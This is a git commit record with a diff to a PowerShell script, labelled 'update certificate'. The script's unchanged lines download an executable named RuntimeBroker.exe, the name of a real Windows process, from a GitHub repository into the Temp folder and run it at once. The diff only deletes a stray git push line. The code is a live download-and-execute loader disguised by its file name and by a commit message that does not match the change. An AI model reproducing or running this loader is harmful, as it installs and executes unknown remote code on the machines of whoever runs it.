8e777ade85bc55d1931310d52cc33cb4d0b838df
Drew K <amackzie@gmail.com>
2024-12-09 02:08:02 -0800

    update certificate

--- script.ps1
+++ script.ps1
@@ -3,5 +3,3 @@ $url = "https://github.com/zessu/cybersec/raw/refs/heads/master/RuntimeBroker.ex
 $output = "$env:Temp/RuntimeBroker.exe"
 Invoke-WebRequest -Uri $url -OutFile $output
 Start-Process -FilePath $output
-
- git push --set-upstream origin mast
